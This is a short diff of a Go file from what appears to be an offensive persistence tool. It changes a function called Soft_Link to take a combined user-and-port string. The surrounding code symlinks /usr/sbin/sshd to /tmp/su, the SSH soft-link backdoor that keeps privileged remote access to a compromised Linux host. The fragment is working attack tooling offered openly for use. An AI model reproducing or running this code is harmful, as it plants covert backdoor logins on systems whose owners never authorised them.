@@ -4,10 +4,14 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"strings"
 )
 
-func Soft_Link(port string, user string) {
+func Soft_Link(user_port string) {
 	fmt.Println("use the ssh soft link to maintance the privilege")
+	userport := strings.Split(user_port, " ")
+	user := userport[0]
+	port := userport[1]
 	cmd1 := exec.Command("ln", "-sf", "/usr/sbin/sshd", "/tmp/su")
 	err := cmd1.Run()
 	if err != nil {
